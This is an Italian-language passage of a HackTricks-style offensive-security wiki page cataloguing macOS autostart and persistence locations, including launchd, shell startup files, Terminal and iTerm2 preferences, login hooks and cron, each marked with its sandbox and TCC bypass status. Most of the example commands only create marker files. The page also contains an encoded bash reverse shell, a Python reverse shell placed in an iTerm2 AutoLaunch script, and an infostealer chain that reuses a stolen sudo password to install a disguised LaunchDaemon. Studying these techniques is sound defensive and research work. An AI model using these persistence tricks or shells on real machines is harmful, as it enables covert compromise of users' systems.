# Autoavvio di macOS

{{#include ../banners/hacktricks-training.md}}

Questa sezione si basa principalmente sulla serie di articoli [**Beyond the good ol’ LaunchAgents**](https://theevilbit.github.io/beyond/); l’obiettivo è aggiungere **più Autostart Locations** (se possibile), indicare **quali tecniche sono ancora funzionanti** oggi con l’ultima versione di macOS (13.4) e specificare le **permissions** necessarie.

## Sandbox Bypass

> [!TIP]
> Qui puoi trovare start locations utili per il **sandbox bypass**, che consentono di eseguire semplicemente qualcosa **scrivendolo in un file** e **attendendo** un’**azione** molto **comune**, una **quantità di tempo** determinata o un’**azione che normalmente puoi eseguire** dall’interno di una sandbox senza necessità di root permissions.

### Launchd

- Utile per il sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Trigger**: Riavvio
- Root richiesto
- **`/Library/LaunchDaemons`**
- **Trigger**: Riavvio
- Root richiesto
- **`/System/Library/LaunchAgents`**
- **Trigger**: Riavvio
- Root richiesto
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Riavvio
- Root richiesto
- **`~/Library/LaunchAgents`**
- **Trigger**: Nuovo accesso
- **`~/Library/LaunchDemons`**
- **Trigger**: Nuovo accesso

> [!TIP]
> Come curiosità, **`launchd`** contiene una property list incorporata nella sezione Mach-O `__Text.__config`, che include altri servizi ben noti che launchd deve avviare. Inoltre, questi servizi possono contenere `RequireSuccess`, `RequireRun` e `RebootOnSuccess`, il che significa che devono essere eseguiti e completati con successo.
>
> Ovviamente, non può essere modificata a causa del code signing.

#### Descrizione ed Exploitation

**`launchd`** è il **primo** **processo** eseguito dal kernel OX S all’avvio e l’ultimo a terminare durante lo spegnimento. Dovrebbe avere sempre il **PID 1**. Questo processo **legge ed esegue** le configurazioni indicate nelle **ASEP** **plist** presenti in:

- `/Library/LaunchAgents`: agent per utente installati dall’amministratore
- `/Library/LaunchDaemons`: daemon a livello di sistema installati dall’amministratore
- `/System/Library/LaunchAgents`: agent per utente forniti da Apple.
- `/System/Library/LaunchDaemons`: daemon a livello di sistema forniti da Apple.

Quando un utente effettua l’accesso, le plist situate in `/Users/$USER/Library/LaunchAgents` e `/Users/$USER/Library/LaunchDemons` vengono avviate con le **permissions dell’utente che ha effettuato l’accesso**.

La **differenza principale tra agent e daemon è che gli agent vengono caricati quando l’utente effettua l’accesso, mentre i daemon vengono caricati all’avvio del sistema** (poiché esistono servizi come ssh che devono essere eseguiti prima che qualunque utente acceda al sistema). Inoltre, gli agent possono utilizzare la GUI, mentre i daemon devono essere eseguiti in background.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Esistono casi in cui un **agent deve essere eseguito prima che l'utente effettui il login**; questi sono chiamati **PreLoginAgents**. Ad esempio, è utile per fornire tecnologie assistive durante il login. Possono essere trovati anche in `/Library/LaunchAgents` (vedi [**qui**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) un esempio).

> [!TIP]
> I nuovi file di configurazione di Daemons o Agents verranno **caricati dopo il prossimo riavvio o usando** `launchctl load <target.plist>`. È **anche possibile caricare file .plist senza quell'estensione** con `launchctl -F <file>` (tuttavia, questi file plist non verranno caricati automaticamente dopo il riavvio).\
> È anche possibile **scaricarli** con `launchctl unload <target.plist>` (il processo indicato verrà terminato),
>
> Per **assicurarsi** che non ci sia **nulla** (come un override) che **impedisca** a un **Agent** o **Daemon** di **eseguirsi**, eseguire: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Elenca tutti gli agent e daemon caricati dall'utente corrente:
```bash
launchctl list
```
#### Esempio di catena LaunchDaemon malevola (riutilizzo della password)

Un recente infostealer per macOS ha riutilizzato una **password sudo acquisita** per installare uno user agent e un LaunchDaemon root:<sup>[[1]](#references)</sup>

- Scrivere il loop dell'agent in `~/.agent` e renderlo eseguibile.
- Generare un plist in `/tmp/starter` che punti a quell'agent.
- Riutilizzare la password rubata con `sudo -S` per copiarlo in `/Library/LaunchDaemons/com.finder.helper.plist`, impostare `root:wheel` e caricarlo con `launchctl load`.
- Avviare silenziosamente l'agent tramite `nohup ~/.agent >/dev/null 2>&1 &` per scollegare l'output.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Se un plist è di proprietà di un utente, anche se si trova in cartelle di sistema dei daemon a livello globale, il **task verrà eseguito dall'utente** e non come root. Questo può impedire alcuni attacchi di privilege escalation.

#### Maggiori informazioni su launchd

**`launchd`** è il **primo** processo in user mode avviato dal **kernel**. L'avvio del processo deve avere **successo** e il processo **non può terminare o andare in crash**. È persino **protetto** da alcuni **segnali di terminazione**.

Una delle prime cose che farebbe `launchd` è **avviare** tutti i **daemon**, come:

- **Daemon timer** basati sull'orario di esecuzione:
- atd (`com.apple.atrun.plist`): Ha un `StartInterval` di 30min
- crond (`com.apple.systemstats.daily.plist`): Ha `StartCalendarInterval` per avviarsi alle 00:15
- **Daemon di rete** come:
- `org.cups.cups-lpd`: Ascolta su TCP (`SockType: stream`) con `SockServiceName: printer`
- SockServiceName deve essere una porta oppure un servizio presente in `/etc/services`
- `com.apple.xscertd.plist`: Ascolta su TCP alla porta 1640
- **Daemon basati sui path**, che vengono eseguiti quando un path specificato cambia:
- `com.apple.postfix.master`: Controlla il path `/etc/postfix/aliases`
- **Daemon per le notifiche IOKit**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Porta Mach:**
- `com.apple.xscertd-helper.plist`: Indica nella voce `MachServices` il nome `com.apple.xscertd.helper`
- **UserEventAgent:**
- Questo è diverso dal precedente. Fa sì che launchd generi app in risposta a eventi specifici. Tuttavia, in questo caso, il binary principale coinvolto non è `launchd`, ma `/usr/libexec/UserEventAgent`. Carica plugin dalla cartella soggetta alle restrizioni SIP /System/Library/UserEventPlugins/, dove ogni plugin indica il proprio inizializzatore nella chiave `XPCEventModuleInitializer` oppure, nel caso dei plugin più vecchi, nel dict `CFPluginFactories` sotto la chiave `FB86416D-6164-2070-726F-70735C216EC0` del suo `Info.plist`.

### file di avvio della shell

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
- Ma è necessario trovare un'app con un bypass TCC che esegua una shell che carica questi file

#### Posizioni

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: Aprire un terminale con zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: Aprire un terminale con zsh
- Root richiesto
- **`~/.zlogout`**
- **Trigger**: Uscire da un terminale con zsh
- **`/etc/zlogout`**
- **Trigger**: Uscire da un terminale con zsh
- Root richiesto
- Potenzialmente altri in: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: Aprire un terminale con bash
- `/etc/profile` (non ha funzionato)
- `~/.profile` (non ha funzionato)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: Dovrebbe attivarsi con xterm, ma **non è installato** e, anche dopo l'installazione, viene restituito questo errore: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Descrizione e sfruttamento

Quando si avvia un ambiente shell come `zsh` o `bash`, vengono eseguiti **determinati file di avvio**. Attualmente macOS usa `/bin/zsh` come shell predefinita. Questa shell viene aperta automaticamente quando viene avviata l'applicazione Terminale oppure quando si accede a un dispositivo tramite SSH. Sebbene `bash` e `sh` siano anch'essi presenti in macOS, devono essere invocati esplicitamente per poter essere utilizzati.<sup>[[2]](#references)</sup>

La man page di zsh, che possiamo leggere con **`man zsh`**, contiene una descrizione dettagliata dei file di avvio.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Applicazioni riaperte

> [!CAUTION]
> Configurare l'exploitation indicata ed eseguire il logout e nuovamente il login, o anche riavviare, non ha eseguito l'app durante i test. Potrebbe essere necessario che l'app sia in esecuzione quando vengono eseguite queste azioni.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Trigger**: riapertura delle applicazioni al riavvio

#### Descrizione ed exploitation

Tutte le applicazioni da riaprire si trovano nel plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Quindi, per fare in modo che le applicazioni da riaprire avviino la propria, è sufficiente **aggiungere la propria app all'elenco**.

L'UUID può essere trovato elencando quella directory oppure con `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Per verificare quali applicazioni verranno riaperte, è possibile eseguire:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Per **aggiungere un'applicazione a questo elenco** puoi usare:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Preferenze di Terminale

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal può avere permessi FDA dell'utente che lo utilizza

#### Posizione

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Trigger**: Aprire Terminal

#### Descrizione ed Exploitation

In **`~/Library/Preferences`** vengono memorizzate le preferenze dell'utente nelle Applications. Alcune di queste preferenze possono contenere una configurazione per **eseguire altre applicazioni/script**.<sup>[[5]](#references)</sup>

Ad esempio, Terminal può eseguire un comando all'avvio:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Questa configurazione viene riflessa nel file **`~/Library/Preferences/com.apple.Terminal.plist`** in questo modo:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Quindi, se il plist delle preferenze del terminale nel sistema potesse essere sovrascritto, la funzionalità **`open`** potrebbe essere utilizzata per **aprire il terminale e quel comando verrebbe eseguito**.

Puoi aggiungerlo dalla CLI con:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Script del Terminale / Altre estensioni di file

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Utilizzare il Terminale per ottenere le autorizzazioni FDA dell'utente

#### Location

- **Ovunque**
- **Trigger**: Aprire il Terminale

#### Descrizione ed Exploitation

Se crei uno [script **`.terminal`**](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) e lo apri, l'**applicazione Terminale** verrà invocata automaticamente per eseguire i comandi indicati al suo interno. Se l'app Terminale dispone di privilegi speciali, come TCC, il tuo comando verrà eseguito con tali privilegi.

Prova con:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Potresti anche usare le estensioni **`.command`**, **`.tool`**, con contenuto costituito da normali shell script, e verranno aperte anch'esse da Terminal.

> [!CAUTION]
> Se Terminal dispone dell'autorizzazione **Full Disk Access**, sarà in grado di completare l'azione (nota che il comando eseguito sarà visibile in una finestra di Terminal).

### Plugin audio

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass di TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Potresti ottenere ulteriore accesso a TCC

#### Posizione

- **`/Library/Audio/Plug-Ins/HAL`**
- Sono richiesti i privilegi di root
- **Trigger**: riavviare coreaudiod o il computer
- **`/Library/Audio/Plug-ins/Components`**
- Sono richiesti i privilegi di root
- **Trigger**: riavviare coreaudiod o il computer
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: riavviare coreaudiod o il computer
- **`/System/Library/Components`**
- Sono richiesti i privilegi di root
- **Trigger**: riavviare coreaudiod o il computer

#### Descrizione

Secondo i writeup precedenti, è possibile **compilare alcuni plugin audio** e caricarli.<sup>[[6]](#references)[[7]](#references)</sup>

### Plugin QuickLook

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass di TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Potresti ottenere ulteriore accesso a TCC

#### Posizione

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Descrizione e sfruttamento

I plugin QuickLook possono essere eseguiti quando **attivi l'anteprima di un file** (premendo la barra spaziatrice con il file selezionato in Finder) e un **plugin che supporta quel tipo di file** è installato.<sup>[[8]](#references)</sup>

È possibile compilare un plugin QuickLook personalizzato, inserirlo in una delle posizioni precedenti per caricarlo, quindi aprire un file supportato e premere la barra spaziatrice per attivarlo.

### ~~Hook di Login/Logout~~

> [!CAUTION]
> Questo non ha funzionato per me, né con il LoginHook dell'utente né con il LogoutHook di root

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass di TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- Devi poter eseguire qualcosa come `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- Si trova in `~/Library/Preferences/com.apple.loginwindow.plist`

Sono deprecati, ma possono essere utilizzati per eseguire comandi quando un utente effettua il Login.<sup>[[9]](#references)</sup>
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Questa impostazione è memorizzata in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Per eliminarlo:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
L'utente root è archiviato in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Bypass condizionale della Sandbox

> [!TIP]
> Qui puoi trovare start locations utili per il **sandbox bypass**, che consentono di eseguire semplicemente qualcosa **scrivendolo in un file** e **facendo affidamento su condizioni non molto comuni**, come **programmi specifici installati, azioni dell'utente "non comuni" o determinati ambienti**.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Utile per il sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- Tuttavia, devi poter eseguire il binary `crontab`
- Oppure essere root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- È richiesto root per l'accesso diretto in scrittura. Non è richiesto root se puoi eseguire `crontab <file>`
- **Trigger**: Dipende dal cron job

#### Descrizione ed Exploitation

Elenca i cron job dell'**utente corrente** con:
```bash
crontab -l
```
Puoi anche vedere tutti i cron jobs degli utenti in **`/usr/lib/cron/tabs/`** e **`/var/at/tabs/`** (richiede root).

In MacOS è possibile trovare diverse cartelle che eseguono script con una **determinata frequenza** in:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Qui puoi trovare i **cron** **jobs** regolari, gli **at** **jobs** (non molto usati) e i **periodic** **jobs** (utilizzati principalmente per la pulizia dei file temporanei). I periodic jobs giornalieri possono essere eseguiti, ad esempio, con: `periodic daily`.<sup>[[10]](#references)</sup>

Per aggiungere programmaticamente un **user cronjob** è possibile utilizzare:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 aveva permessi TCC concessi

#### Posizioni

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Trigger**: Apertura di iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Trigger**: Apertura di iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Trigger**: Apertura di iTerm

#### Descrizione e sfruttamento

Gli script memorizzati in **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** verranno eseguiti. Ad esempio:<sup>[[11]](#references)</sup>
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
oppure:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Verrà eseguito anche lo script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Le preferenze di iTerm2 disponibili in **`~/Library/Preferences/com.googlecode.iterm2.plist`** possono **indicare un comando da eseguire** quando il terminale iTerm2 viene aperto.

Questa impostazione può essere configurata nelle impostazioni di iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

E il comando è riportato nelle preferenze:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Puoi impostare il comando da eseguire con:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> È altamente probabile che esistano **altri modi per abusare delle preferenze di iTerm2** per eseguire comandi arbitrari.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Tuttavia, xbar deve essere installato
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Richiede i permessi di accessibilità

#### Posizione

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: una volta eseguito xbar

#### Descrizione

Se il programma popolare [**xbar**](https://github.com/matryer/xbar) è installato, è possibile scrivere uno shell script in **`~/Library/Application\ Support/xbar/plugins/`**, che verrà eseguito all'avvio di xbar:<sup>[[12]](#references)</sup>
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Utile per bypassare sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ma Hammerspoon deve essere installato
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Richiede i permessi Accessibility

#### Posizione

- **`~/.hammerspoon/init.lua`**
- **Trigger**: Una volta eseguito Hammerspoon

#### Descrizione

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) funge da piattaforma di automazione per **macOS**, utilizzando il **linguaggio di scripting LUA** per le proprie operazioni. In particolare, supporta l'integrazione di codice AppleScript completo e l'esecuzione di shell script, potenziando significativamente le sue capacità di scripting.<sup>[[13]](#references)</sup>

L'app cerca un singolo file, `~/.hammerspoon/init.lua`, e, quando viene avviata, lo script viene eseguito.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ma BetterTouchTool deve essere installato
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Richiede i permessi Automation-Shortcuts e Accessibility

#### Posizione

- `~/Library/Application Support/BetterTouchTool/*`

Questo tool consente di indicare applicazioni o script da eseguire quando vengono premute determinate shortcut. Un attacker potrebbe riuscire a configurare la propria **shortcut e l'azione da eseguire nel database** per eseguire codice arbitrario (una shortcut potrebbe consistere semplicemente nella pressione di un tasto).

### Alfred

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ma Alfred deve essere installato
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Richiede i permessi Automation, Accessibility e persino Full-Disk access

#### Posizione

- `???`

Consente di creare workflow in grado di eseguire codice quando vengono soddisfatte determinate condizioni. Potenzialmente, un attacker potrebbe creare un file workflow e fare in modo che Alfred lo carichi (è necessario acquistare la versione premium per usare i workflow).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ma ssh deve essere abilitato e utilizzato
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH consente di avere accesso FDA

#### Posizione

- **`~/.ssh/rc`**
- **Trigger**: Accesso tramite ssh
- **`/etc/ssh/sshrc`**
- Richiede root
- **Trigger**: Accesso tramite ssh

> [!CAUTION]
> Per attivare ssh è necessario Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Descrizione e sfruttamento

Per impostazione predefinita, a meno che non sia presente `PermitUserRC no` in `/etc/ssh/sshd_config`, quando un utente **accede tramite SSH** vengono eseguiti gli script **`/etc/ssh/sshrc`** e **`~/.ssh/rc`**.<sup>[[14]](#references)</sup>

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- È però necessario eseguire `osascript` con args
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Posizioni

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Accesso
- Payload di exploit memorizzato con chiamata a **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Accesso
- Richiede root

#### Descrizione

In Preferenze di Sistema -> Utenti e gruppi -> **Login Items** si trovano gli **elementi da eseguire quando l'utente effettua l'accesso**.\
È possibile elencarli, aggiungerli e rimuoverli dalla command line:<sup>[[15]](#references)</sup>
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Questi elementi sono memorizzati nel file **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

I **Login items** possono essere indicati **anche** utilizzando l'API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc), che memorizzerà la configurazione in **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP as Login Item

(Controlla la sezione precedente sui Login Items; questa è un'estensione)

Se memorizzi un file **ZIP** come **Login Item**, **`Archive Utility`** lo aprirà e, se lo zip fosse ad esempio memorizzato in **`~/Library`** e contenesse la cartella **`LaunchAgents/file.plist`** con una backdoor, tale cartella verrebbe creata (non lo è di default) e il plist verrebbe aggiunto, così la prossima volta che l'utente effettuerà nuovamente il login, la **backdoor indicata nel plist verrà eseguita**.

Un'altra opzione sarebbe creare i file **`.bash_profile`** e **`.zshenv`** all'interno della HOME dell'utente, così, se la cartella LaunchAgents esiste già, questa tecnica continuerebbe a funzionare.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Tuttavia è necessario **eseguire** **`at`** e deve essere **abilitato**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- È necessario **eseguire** **`at`** e deve essere **abilitato**

#### **Description**

I task di `at` sono progettati per **pianificare task una tantum** da eseguire a determinati orari. A differenza dei cron job, i task di `at` vengono rimossi automaticamente dopo l'esecuzione. È importante notare che questi task persistono tra i riavvii del sistema, rendendoli potenziali problemi di sicurezza in determinate condizioni.<sup>[[16]](#references)</sup>

Per **default** sono **disabilitati**, ma l'utente **root** può **abilitarli** con:
```bash
